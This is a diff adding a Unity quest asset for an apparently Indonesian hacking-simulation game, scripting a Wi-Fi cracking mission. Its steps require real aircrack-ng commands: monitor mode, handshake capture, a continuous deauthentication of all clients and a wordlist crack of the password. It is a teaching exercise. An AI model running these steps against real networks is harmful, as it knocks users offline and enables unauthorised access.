@@ -1,0 +1,115 @@
+%YAML 1.1
+%TAG !u! tag:unity3d.com,2011:
+--- !u!114 &11400000
+MonoBehaviour:
+  m_ObjectHideFlags: 0
+  m_CorrespondingSourceObject: {fileID: 0}
+  m_PrefabInstance: {fileID: 0}
+  m_PrefabAsset: {fileID: 0}
+  m_GameObject: {fileID: 0}
+  m_Enabled: 1
+  m_EditorHideFlags: 0
+  m_Script: {fileID: 11500000, guid: 415f1d7705de97e4d8b4e6d8bf3e136e, type: 3}
+  m_Name: 0_Quest_WifiCrack
+  m_EditorClassIdentifier: 
+  questID: 0_Start
+  questName: 
+  questChat: 
+  expReward: 10
+  overviewChat: 
+  kirimChat: 
+  balasChat: 
+  questSteps:
+  - requiredFile: 
+    requiredInput: 
+    userToFind: 
+    requiredButtonTag: btnTerminal
+    questType: 3
+  - requiredFile: 
+    requiredInput: apt-get install aircrack-ng
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: iwconfig
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: airmon-ng start wlan0
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: iwconfig
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: airodump-ng wlan0mon
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: airodump-ng -w hack -c 97 -bssid 51:11:25:AB:A6:42
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: aireplay-ng --deauth 0 -a 51:11:25:AB:A6:42 wlan0mon
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: ls
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: aircrack-ng hack-01.cap -w wordlists.txt
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: 
+    userToFind: 
+    requiredButtonTag: btnConnect
+    questType: 3
+  - requiredFile: 
+    requiredInput: airmon-ng stop wlan0mon
+    userToFind: 
+    requiredButtonTag: 
+    questType: 2
+  - requiredFile: 
+    requiredInput: 
+    userToFind: 
+    requiredButtonTag: btnWifiCrack
+    questType: 3
+  activeQuestText:
+  - "Buka software terminal \n\nNote: Software terletak di bawah"
+  - 'Install tool aircrack-ng
+
+
+    Note: apt-get install [nama tools]'
+  - Lakukan konfigurasi interface jaringan dengan command iwconfig
+  - "Aktifkan mode monitor \n\nNote: airmon-ng start [interface]"
+  - Lakukan konfigurasi interface jaringan kembali
+  - "Tampilkan jaringan wifi disekiar \n\nNote: airodump-ng [interface]"
+  - "Ambil file handshake dengan nama hack pada ESSID Wifi ke dua \nNote: airodump-ng
+    -w [file handshake] -c [channel] -bssid [bssid]"
+  - "Putuskan semua koneksi yang terhubung ke Wifi ke dua \nNote: aireplay-ng --deauth
+    0 -a [bssid] [interface]"
+  - Tampilkan list file dan direktori dengan command ls
+  - 'Lakukan cracking pada file handshake dengan wordlists.txt untuk mendapatkan
+    password
+
+    Note: aircrack-ng [nama file handshake] -w [nama file wordlists]'
+  - 'Connect ke wifi ke dua dengan password yang telah diperoleh
+
+    Note: wifi
+    ada di sebelah kanan atas'
+  - "Kembalikan ke mode managed \n\nNote: airmon-ng stop [interface]"
+  - 'Buka log misi wifi cracking
+
+
+    Note: klik logo wifi cracking pada log misi'
